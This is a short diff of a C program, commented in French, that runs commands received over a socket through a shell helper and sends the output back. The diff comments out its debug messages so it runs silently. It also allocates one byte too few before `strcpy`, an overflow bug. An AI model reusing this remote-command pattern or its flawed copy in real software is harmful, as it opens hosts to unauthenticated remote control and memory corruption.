@@ -48,8 +48,8 @@ int main()
 			command = malloc((strlen(buffer))*sizeof(char)); //allocation du pointer
 			strcpy(command,buffer);
 			char* path = shellcommand(command);
-			printf("resultat : %s\n", path);
-			printf("sending path...");
+			//printf("resultat : %s\n", path);
+			//printf("sending path...");
 			send(sock, path, (strlen(path))*sizeof(char), 0);
 
 		}	
